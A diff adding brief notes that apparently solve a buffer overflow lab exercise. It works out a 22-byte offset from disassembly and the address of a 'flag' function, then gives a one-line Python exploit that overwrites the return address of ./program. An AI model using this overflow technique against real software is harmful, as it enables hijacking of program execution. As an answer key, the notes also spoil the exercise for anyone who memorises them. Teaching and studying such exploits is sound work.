@@ -1,0 +1,14 @@
+https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
+
+1. 
+80484bd:       8d 45 ee                lea    -0x12(%ebp),%eax 
+=> 0x12 = 18
+
+2. 
+0804848b <flag>:
+
+3. 
+18 + 4 = 22
+
+Solution:
+python -c 'print "a"*22 + "\x8b\x84\x04\x08"' | ./program
